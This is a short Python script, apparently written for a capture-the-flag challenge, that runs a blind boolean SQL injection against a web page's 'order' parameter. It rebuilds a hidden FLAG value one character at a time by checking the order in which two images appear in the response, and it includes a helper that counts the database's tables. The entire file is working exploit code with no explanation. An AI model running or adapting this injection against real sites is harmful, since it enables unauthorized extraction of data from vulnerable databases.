import requests

#url = 'http://photoshop0.scoreboard.ns01.info/all.php'

def scan_name(url, ch):
	query1 = '?order=rand((select ascii(substring(FLAG,'
	query2 = ',1)) from flag limit 1)='
	for j in range (1,100):
		for i in range(0,128-32):
			newquery = query1 + str(j) + query2 + str(ch + i)
			response = requests.get(url+newquery+')')
			try:
				if response.text.index('cthulhu.png') < response.text.index('hacker.png'):
					print chr(ch+i)
					break
			except:
				break

def scan_length(url):
	query = '?order=rand((select count(*) from information_schema.tables)='
	for i in range(1,1000):
		newquery = query + str(i) + ')'
		response = requests.get(url+newquery)
		try:
			if response.text.index('cthulhu.png') < response.text.index('hacker.png'):
				print i
				break
		except:
				break

if __name__ == '__main__':
	url = 'http://photoshop0.scoreboard.ns01.info/all.php'
	ch = 32
	scan_name(url,ch)
#	scan_length(url)
#payload = url + query + str(ch) + ')'
#print payload
#response = requests.get(payload)	
#print response.text
